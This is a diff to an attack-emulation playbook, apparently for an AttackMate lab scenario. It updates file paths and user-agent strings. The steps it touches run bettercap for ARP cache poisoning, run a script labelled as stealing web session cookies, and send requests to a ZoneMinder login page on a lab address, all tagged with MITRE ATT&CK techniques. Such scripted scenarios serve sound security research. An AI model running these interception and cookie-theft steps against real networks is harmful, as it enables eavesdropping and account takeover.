@@ -6,7 +6,7 @@
 # noinspection YAMLSchemaValidation
 commands:
   - type: shell
-    cmd: sudo bettercap -caplet bettercap.cap
+    cmd: sudo bettercap -caplet /home/aecid/scenario5/bettercap.cap
     background: True
     kill_on_exit: False
     metadata:
@@ -15,7 +15,7 @@ commands:
        technique_name: "Network Sniffing,Adversary-in-the-Middle: ARP Cache Poisoning "
 
   - type: shell
-    cmd: sudo /bin/python3 /home/aecid/scenario5/get_cookie.py
+    cmd: sudo /usr/local/share/attackmate/venv/bin/python3 /home/aecid/scenario5/get_cookie.py
     metadata:
        techniques: "T1539"
        tactic: "Credential Access"
@@ -42,7 +42,7 @@ commands:
       Host: "172.17.100.121"
       Connection: "keep-alive"
       Origin: "http://172.17.100.121"
-      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/129.0.0.0 Safari/537.36"
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.7103.25 Safari/537.36"
       Accept: "*/*"
       Referer: "http://172.17.100.121/zm/?view=login"
       Accept-Encoding: "gzip, deflate"
@@ -63,7 +63,7 @@ commands:
       Host: "172.17.100.121"
       Connection: "keep-alive"
       Origin: "http://172.17.100.121"
-      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/129.0.0.0 Safari/537.36"
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.7103.25 Safari/537.36"
       Accept: "*/*"
       Referer: "http://172.17.100.121/zm/?view=login"
       Accept-Encoding: "gzip, deflate"
@@ -84,7 +84,7 @@ commands:
       Host: "172.17.100.121"
       Connection: "keep-alive"
       Origin: "http://172.17.100.121"
-      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/129.0.0.0 Safari/537.36"
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.7103.25 Safari/537.36"
       Accept: "*/*"
       Referer: "http://172.17.100.121/zm/?view=login"
       Accept-Encoding: "gzip, deflate"
